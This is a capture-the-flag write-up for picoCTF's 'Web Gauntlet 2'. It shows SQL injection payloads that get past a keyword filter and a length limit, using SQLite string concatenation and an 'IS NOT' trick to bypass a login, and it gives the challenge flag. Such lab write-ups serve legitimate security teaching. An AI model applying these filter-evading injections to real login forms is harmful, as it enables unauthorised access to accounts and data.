# Web Gauntlet 2

### Description:
This website looks familiar...
Additional details will be available after launching your challenge instance.
"Click `Launch Instance`."
Site: http://wily-courier.picoctf.net:65391/
Filter: http://wily-courier.picoctf.net:65391/filter.php

Hint: Each filter is separated by a space. Spaces are not filtered. / There is only 1 round this time, when you beat it the flag will be in filter.php. / There is a length component now. / sqlite

### Commands / Steps:

```bash
# Step 1: Open the challenge page and filter page.
# Site: http://wily-courier.picoctf.net:65391/
# Filter: http://wily-courier.picoctf.net:65391/filter.php
# Hint on filter page: Filters: or and true false union like = > < ; -- /* */ admin

# Step 2: Use a username payload that bypasses the `admin` filter by concatenation.
ad'||'min

# Step 3: Use a password payload that avoids the remaining filters and respects the length limit.
'IS NOT' abc
# Error that is shown after submitting the username and password:
# SELECT username, password FROM users WHERE username='ad'||'min' AND password=''IS NOT' abc'
# 
# Step 4: Go to filter.php and refresh the page to get the flag.
```

### Flag:

> picoCTF{0n3_m0r3_t1m3_85a265ac}

### Notes / Tips

- The important twist is that the filters are space-separated, so you can combine allowed tokens to form a payload
- `ad'||'min` bypasses the `admin` filter with string concatenation in SQLite
- The password payload must fit the new length restriction while also avoiding filtered keywords
- In this challenge, the flag is exposed on `filter.php` after a successful login bypass


